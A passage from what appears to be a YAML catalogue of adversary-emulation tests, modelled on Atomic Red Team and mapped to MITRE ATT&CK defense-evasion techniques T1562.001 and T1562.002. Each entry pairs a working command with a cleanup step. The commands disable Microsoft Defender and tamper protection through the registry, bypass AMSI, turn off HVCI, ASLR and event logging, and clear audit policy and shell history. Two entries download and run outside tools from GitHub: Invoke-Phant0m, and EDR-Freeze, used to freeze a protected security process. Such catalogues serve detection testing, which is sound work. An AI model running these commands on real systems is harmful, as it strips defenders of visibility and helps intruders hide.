        IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f )
        IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )
      cleanup: |-
        schtasks /create /xml "%temp%\Windows_Defender_Scheduled_Scan.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f
        schtasks /create /xml "%temp%\Windows_Defender_Cleanup.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f
        schtasks /create /xml "%temp%\Windows_Defender_Verification.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f
        schtasks /create /xml "%temp%\Windows_Defender_Cache_Maintenance.xml" /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f
      timeout: 120
      elevation_required: true
    - name: Clear History
      type: sh
      platform: linux
      command: history -c
      timeout: 60
      elevation_required: true
    - name: Suspend History
      type: sh
      platform: linux
      command: set +o history
      cleanup: set -o history
      timeout: 60
      elevation_required: true
    - name: Reboot Linux Host via Kernel System Request
      type: sh
      platform: linux
      command: "echo 1> /proc/sys/kernel/sysrq \necho b> /proc/sysrq-trigger"
      timeout: 60
      elevation_required: true
    - name: Clear Pagging Cache
      type: sh
      platform: linux
      command: |-
        free && echo 3 > /proc/sys/vm/drop_caches && free
        echo 3> /proc/sys/vm/drop_caches
      timeout: 60
      elevation_required: true
    - name: Disable Memory Swap
      type: sh
      platform: linux
      command: "swapon -a \nsleep 2\nswapoff -a\nsync"
      cleanup: |-
        swapon -a
        sleep 2
        sync
      timeout: 60
      elevation_required: true
    - name: Disable Hypervisor-Enforced Code Integrity (HVCI)
      type: powershell
      platform: windows
      command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d 0 /f
      cleanup: |-
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /f
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequirePlatformSecurityFeatures" /f
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "Locked" /f
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /f
        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Locked" /f
      timeout: 120
      elevation_required: true
    - name: AMSI Bypass - Override AMSI via COM
      type: cmd
      platform: windows
      command: REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
      cleanup: REG DELETE HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /f
      timeout: 120
      elevation_required: true
    - name: Tamper with Defender ATP on Linux/MacOS
      type: sh
      platform: linux
      command: sudo mdatp config real-time-protection --value disabled
      cleanup: sudo mdatp config real-time-protection --value enabled
      timeout: 60
      elevation_required: true
    - name: Tamper with Defender ATP on Linux/MacOS
      type: sh
      platform: macos
      command: sudo mdatp config real-time-protection --value disabled
      cleanup: sudo mdatp config real-time-protection --value enabled
      timeout: 60
      elevation_required: true
    - name: Tamper with Windows Defender Registry - Reg.exe
      type: cmd
      platform: windows
      command: "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul"
      cleanup: "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"0\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul"
      timeout: 120
      elevation_required: true
    - name: Tamper with Windows Defender Registry - Powershell
      type: powershell
      platform: windows
      command: "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 1  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 0 \nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 0"
      cleanup: "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 0  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 1\nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 1"
      timeout: 120
      elevation_required: true
    - name: ESXi - Disable Account Lockout Policy via PowerCLI
      type: powershell
      platform: linux
      command: "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server atomic.local -User root -Password pass\nGet-AdvancedSetting -Entity atomic.local -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false\nDisconnect-VIServer -Confirm:$false"
      timeout: 120
      elevation_required: true
    - name: Delete Microsoft Defender ASR Rules - InTune
      type: powershell
      platform: windows
      command: |-
        $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager"

        if (-not (Test-Path $registryPath)) {
          New-Item -Path $registryPath -Force
          Write-Host "Registry key created: $registryPath"
        }

        $registryValueName = "ASRRules"

        if (Test-Path "$registryPath\$registryValueName") {
          Remove-ItemProperty -Path $registryPath -Name $registryValueName
          Write-Host "Registry value deleted: $registryValueName"
        } else {
          New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value "36190899-1602-49e8-8b27-eb1d0a1ce869=1" -Force
          Write-Host "Registry value created: $registryValueName"
        }


        Remove-ItemProperty -Path $registryPath -Name $registryValueName
        Write-Host "Registry value deleted: $registryValueName"
      timeout: 120
      elevation_required: true
    - name: Delete Microsoft Defender ASR Rules - GPO
      type: powershell
      platform: windows
      command: |-
        $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules"

        if (-not (Test-Path $registryPath)) {
            New-Item -Path $registryPath -Force
            Write-Host "Registry key created: $registryPath"
        }

        $newValueName = "36190899-1602-49e8-8b27-eb1d0a1ce869"
        $newValueData = "1"
        New-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force
        Write-Host "Registry value created: $newValueName with data $newValueData"

        Remove-ItemProperty -Path $registryPath -Name $newValueName
        Write-Host "Registry value deleted: $newValueName"
      timeout: 120
      elevation_required: true
    - name: AMSI Bypass - Create AMSIEnable Reg Key
      type: powershell
      platform: windows
      command: |-
        New-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Force | Out-Null
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Name "AmsiEnable" -Value 0 -PropertyType DWORD -Force | Out-Null
      cleanup: Remove-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Recurse -Force 2> $null
      timeout: 120
      elevation_required: true
    - name: Disable EventLog-Application Auto Logger Session Via Registry - Cmd
      type: cmd
      platform: windows
      command: reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" /v "Start" /t REG_DWORD /d "0" /f
      cleanup: reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" /v "Start" /t REG_DWORD /d "1" /f
      timeout: 120
      elevation_required: true
    - name: Disable EventLog-Application Auto Logger Session Via Registry - PowerShell
      type: powershell
      platform: windows
      command: New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application -Name Start -Value 0 -PropertyType "DWord" -Force
      cleanup: New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application -Name Start -Value 1 -PropertyType "DWord" -Force
      timeout: 120
      elevation_required: true
    - name: Disable EventLog-Application ETW Provider Via Registry - Cmd
      type: cmd
      platform: windows
      command: reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}" /v "Enabled" /t REG_DWORD /d "0" /f
      cleanup: reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}" /v "Enabled" /t REG_DWORD /d "1" /f
      timeout: 120
      elevation_required: true
    - name: Disable EventLog-Application ETW Provider Via Registry - PowerShell
      type: powershell
      platform: windows
      command: New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}" -Name Enabled -Value 0 -PropertyType "DWord" -Force
      cleanup: New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}" -Name Enabled -Value 1 -PropertyType "DWord" -Force
      timeout: 120
      elevation_required: true
    - name: Freeze PPL-protected process with EDR-Freeze
      type: powershell
      platform: windows
      command: "# Enable SeDebugPrivilege\nAdd-Type -TypeDefinition @\"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class TokenAdjuster {\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);\n\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);\n\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,\n        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);\n\n    [StructLayout(LayoutKind.Sequential, Pack = 1)]\n    public struct TOKEN_PRIVILEGES {\n        public int PrivilegeCount;\n        public long Luid;\n        public int Attributes;\n    }\n\n    public const int SE_PRIVILEGE_ENABLED = 0x00000002;\n    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;\n    public const uint TOKEN_QUERY = 0x0008;\n\n    public static bool EnableSeDebugPrivilege() {\n        IntPtr hToken;\n        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))\n            return false;\n\n        long luid;\n        if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid))\n            return false;\n\n        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();\n        tp.PrivilegeCount = 1;\n        tp.Luid = luid;\n        tp.Attributes = SE_PRIVILEGE_ENABLED;\n\n        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);\n    }\n}\n\"@\n\n$result = [TokenAdjuster]::EnableSeDebugPrivilege()\nif ($result) {\n    Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green\n} else {\n    Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red\n    exit 1\n}\n\n# Get basic process info\n$process = Get-Process -Name $SecurityHealthService -ErrorAction Stop\n$processName = $process.ProcessName\nWrite-Host \"Process Name: $processName)\"\nWrite-Host \"PID: $($process.Id)\"\n        \n# Get executable path and user info\n$query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"\n$wmiProcess = Get-WmiObject -Query $query\n\n$owner = $wmiProcess.GetOwner()\n    Write-Host \"User: $($owner.Domain)\\$($owner.User)\"\n\n\n# Get the folder of the current script\n$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition\n\n# Download latest EDR-Freeze package and extract (force replace)\n$downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"\n$zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"\nWrite-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan\ntry {\n    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop\n    Write-Host \"Download completed: $zipPath\" -ForegroundColor Green\n    $extractFolder = $scriptFolder\n    if (Test-Path $zipPath) {\n        Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan\n        if (Test-Path $extractFolder) {\n            # Ensure target exe not locked; attempt to stop any running instance silently\n            Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue\n        }\n        Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null\n        # Custom extraction routine (overwrite existing) compatible with .NET Framework (no bool overwrite overload)\n        $archive = $null\n        try {\n            $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)\n            foreach ($entry in $archive.Entries) {\n                if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue }\n                if ($entry.FullName.EndsWith('/')) { # directory entry\n                    $dirPath = Join-Path $extractFolder $entry.FullName\n                    if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null }\n                    continue\n                }\n                $destPath = Join-Path $extractFolder $entry.FullName\n                $destDir = Split-Path $destPath -Parent\n                if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }\n                if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue }\n                try {\n                    # Use static extension method (PowerShell 5.1 compatible)\n                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)\n                } catch {\n                    Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow\n                }\n            }\n            Write-Host \"Extraction completed.\" -ForegroundColor Green\n        } finally {\n            if ($archive) { $archive.Dispose() }\n        }\n    }\n} catch {\n    Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red\n}\n\n# Wait 15s before putting targeted process before putting it in the comma\nWrite-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 5\nWrite-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 5\nWrite-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 3\nWrite-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 2\n\n# Put targeted  process in the comma for 15s\n# Discover the EDR-Freeze executable dynamically (pick most recent if multiple)\n$edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |\n    Sort-Object LastWriteTime -Descending |\n    Select-Object -First 1 -ExpandProperty Name\nif (-not $edrFreezeExeName) {\n    Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red\n    exit 1\n}\n\n$edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName\nWrite-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan\nWrite-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow\nStart-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null"
      cleanup: |-
        Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue
        Write-Output "File deleted: $edrFreezeExe"
      timeout: 120
      elevation_required: true
    - name: Disable ASLR Via sysctl parameters - Linux
      type: bash
      platform: linux
      command: sysctl -w kernel.randomize_va_space=0
      cleanup: sysctl -w kernel.randomize_va_space=2
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1562/001
  is_safe: false
- id: T1562.002
  name: Disable Windows Event Logging
  description: |-
    Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.

    The EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when ...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Disable Windows IIS HTTP Logging
      type: powershell
      platform: windows
      command: C:\Windows\System32\inetsrv\appcmd.exe set config "Default Web Site" /section:httplogging /dontLog:true
      cleanup: |-
        if(Test-Path "C:\Windows\System32\inetsrv\appcmd.exe"){
          C:\Windows\System32\inetsrv\appcmd.exe set config "Default Web Site" /section:httplogging /dontLog:false *>$null
        }
      timeout: 120
    - name: Disable Windows IIS HTTP Logging via PowerShell
      type: powershell
      platform: windows
      command: set-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\" -filter "system.webServer/httpLogging" -name dontLog -value $true
      cleanup: |-
        if(Test-Path "C:\Windows\System32\inetsrv\appcmd.exe"){
          C:\Windows\System32\inetsrv\appcmd.exe set config "Default Web Site" /section:httplogging /dontLog:false *>$null
        }
      timeout: 120
    - name: Kill Event Log Service Threads
      type: powershell
      platform: windows
      command: |-
        Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
        $url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
        $output = "$env:TEMP\Invoke-Phant0m.ps1"
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $output)
        cd $env:TEMP
        Import-Module .\Invoke-Phant0m.ps1
        Invoke-Phant0m
      cleanup: |-
        Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" -fore red
        Remove-Item "$env:TEMP\Invoke-Phant0m.ps1" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Impair Windows Audit Log Policy
      type: cmd
      platform: windows
      command: |-
        auditpol /set /category:"Account Logon" /success:disable /failure:disable
        auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
        auditpol /set /category:"Detailed Tracking" /success:disable
      cleanup: |-
        auditpol /set /category:"Account Logon" /success:enable /failure:enable
        auditpol /set /category:"Detailed Tracking" /success:enable
        auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
      timeout: 120
      elevation_required: true
    - name: Clear Windows Audit Policy Config
      type: cmd
      platform: windows
      command: |-
        auditpol /clear /y
        auditpol /remove /allusers
      cleanup: |-
        auditpol /set /category:"Account Logon" /success:enable /failure:enable
        auditpol /set /category:"Detailed Tracking" /success:enable
        auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
      timeout: 120
      elevation_required: true
    - name: Disable Event Logging with wevtutil
      type: cmd
      platform: windows
      command: wevtutil sl "Microsoft-Windows-IKE/Operational" /e:false
      cleanup: wevtutil sl "Microsoft-Windows-IKE/Operational" /e:true
      timeout: 120
    - name: Makes Eventlog blind with Phant0m
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\T1562.002\bin\Phant0m.exe"'
      cleanup: echo "Sorry you have to reboot"
      timeout: 120
    - name: Modify Event Log Channel Access Permissions via Registry - PowerShell
      type: powershell
      platform: windows
      command: |-
